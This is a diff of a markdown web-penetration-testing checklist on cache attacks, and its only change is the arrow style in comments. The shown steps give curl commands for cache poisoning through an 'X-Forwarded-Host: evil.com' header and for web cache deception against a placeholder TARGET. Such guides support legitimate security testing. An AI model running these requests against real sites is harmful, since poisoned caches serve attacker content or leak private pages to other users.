@@ -21,13 +21,13 @@ Pragma: x-get-cache
 #### STEP 2: POISON STATIC RESOURCES
 ```bash
 curl -H "X-Forwarded-Host: evil.com" https://TARGET/js/main.js
-# → Response contains evil.com in the body → cached → poisons all users
+# -> Response contains evil.com in the body -> cached -> poisons all users
 ```
 
 #### STEP 3: PATH CONFUSION (Web Cache Deception)
 ```bash
 curl https://TARGET/profile/nonexistent.css
-# → Returns profile page with .css extension → cached as static
+# -> Returns profile page with .css extension -> cached as static
 ```
 
 #### ANTI-PATTERNS: Don't just test X-Forwarded-Host — there are 15+ cache headers.
